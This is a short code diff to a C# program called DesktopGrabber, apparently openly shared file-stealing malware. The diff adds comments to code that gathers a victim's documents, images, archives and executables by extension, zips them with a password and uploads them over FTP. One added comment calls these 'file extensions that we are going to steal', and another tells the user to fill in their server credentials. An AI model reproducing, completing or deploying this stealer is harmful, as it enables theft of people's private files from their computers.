@@ -13,7 +13,7 @@ namespace DesktopGrabber
         {
             new DesktopGrabber
             {
-                Extensions = new List<string> { ".jpeg", ".jpg", ".txt", ".doc", ".docx", ".zip", ".exe", ".rar", ".doc", ".docx", ".mp4", },
+                Extensions = new List<string> { ".jpeg", ".jpg", ".txt", ".doc", ".docx", ".zip", ".exe", ".rar", ".doc", ".docx", ".mp4", }, // file extensions that we are going to steal, you can add more if you want to
                 SizeLimit = 50 * 1000,
                 ZipName = "files.zip",
                 ZipPassword = "spuqe"
@@ -71,7 +71,7 @@ namespace DesktopGrabber
         private bool Send()
         {
             WebClient client = new WebClient();
-            client.Credentials = new NetworkCredential("root", "1234");
+            client.Credentials = new NetworkCredential("root", "1234"); // add your credientals here!
             client.UploadFile(
                 "ftp://127.0.0.1/grabber/files.zip", @"C:\desktop\files.zip"); // we expect the user opened it in his desktop..
             return true;
